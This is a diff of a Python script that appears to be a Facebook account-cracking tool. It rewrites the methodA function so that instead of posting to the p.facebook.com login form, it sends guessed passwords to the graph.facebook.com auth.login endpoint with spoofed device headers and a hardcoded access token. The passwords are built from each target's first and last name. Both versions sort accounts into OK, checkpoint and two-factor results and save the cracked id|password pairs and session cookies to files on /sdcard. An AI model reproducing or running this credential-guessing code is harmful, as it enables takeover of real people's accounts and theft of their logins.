@@ -1,5 +1,5 @@
 #!/usr/bin/python
-#Original written By Muhmmad Sarfraz
+#BARKI Teach my wp 03188939326
 
 import os,zlib
 
@@ -118,7 +118,7 @@ def sarfraz():
     print(f'[8] Separate Ids')
     print(f'[9] Remove Duplicate IDs')
     print(f'[W] Join Whatsapp Group ')
-    print(f'[F]Facebook  ')
+    print(f'[F] Join Facebook Group ')
     print('')
     select = input('Select Menu>: ')
     if select =='1':
@@ -197,58 +197,71 @@ class main_crack():
             time.sleep(2)
             main_crack().crack(id)
             
-    def methodA(ids,names,passlist,total_ids):
-    global loop,ok,cp,tf,ua_opera
-    rcol =['\033[1;32mM-1','\033[1;31mM-1']
-    rr = random.choice(rcol)
-    whi = '\033[0;97m'
-    sys.stdout.write(f'\r%s {WHITE}[HAMII 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
-    try:
-        first = names.split(' ')[0]
+    def methodA(self, sid, name, psw):
         try:
-            last = names.split(' ')[1]
-        except:
-            last = 'Khan'
-        ps = first.lower()
-        ps2 = last.lower()
-        for fikr in passlist:
-            ua = random.choice(ugen)
-            ua1 = random.choice(rug)
-            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-            r = requests.Session()
-            url1 = f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
-            hed1 = {"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua1,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-            req1 = r.get(url1,headers=hed1)
-            data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : ids,'pass' : pas,'next' : f'https://p.facebook.com/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
-            url2 = f'https://p.facebook.com/login/device-based/validate-password/?shbl=0'
-            hed2 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'en-US,en;q=0.9','x-requested-with': 'mark.via.gp','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': f'https://p.facebook.com','referer': f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
-            next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
-            cookies = r.cookies.get_dict().keys()
-            if 'c_user' in cookies:
-                os.system("play-audio HAMII_OK.mp3")
-                print('\r\033[1;32m[HAMII-OK] '+ids+' | '+pas+'\033[1;97m')
-                ok.append(ids)
-                open('/sdcard/HAMII_OK.txt', 'a').write(ids+' | '+pas+'\n')
-                break
-            elif 'checkpoint' in cookies:
-                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
-                #print(d.group(1))
-                if 'Enter login code to continue' in str(d):
-                    os.system("play-audio HAMII_2F.mp3")
-                    print('\r\033[1;35m[HAMII-2F] '+ids+' | '+pas+'\033[1;97m')
-                    tf.append(ids)
-                    open('/sdcard/HAMII_2F.txt', 'a').write(ids+' | '+pas+'\n')
+            global oks,cps,loop
+            sys.stdout.write(f"\r {S}[SSB] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
+            sys.stdout.flush()
+            fs = name.split(' ')[0]
+            try:
+                ls = name.split(' ')[1]
+            except:
+                ls = fs
+            for pw in psw:
+                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
+                with requests.Session() as session:
+                    data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": sid,
+"password": ps,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "GB",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': randBuildvsskj(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+                q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if 'session_key' in q:
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
+                    print(f"\r{R} [SSB-OK] {sid} | {ps} {S}")
+                    oks.append(sid)
+                    open('/sdcard/SSB_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
+                elif 'www.facebook.com' in q['error']['message']:
+                     #print(f"\r{A} [SSB-CP] {sid} | {ps} {S}")
+                     cps.append(sid)
+                     open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
-                    os.system("play-audio HAMII_CP.mp3")
-                    print('\r\033[1;31m[HAMII-CP] '+ids+' | '+pas+'\033[1;97m')
-                    cp.append(ids)
-                    open('/sdcard/HAMII_CP.txt', 'a').write(ids+' | '+pas+'\n')
-                    break
-            else:continue
-        loop+=1
-    except Exception as e:
-        pass
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+            self.methodA(sid, name, ps)
             
     def methodC(self, sid, name, psw):
         try:
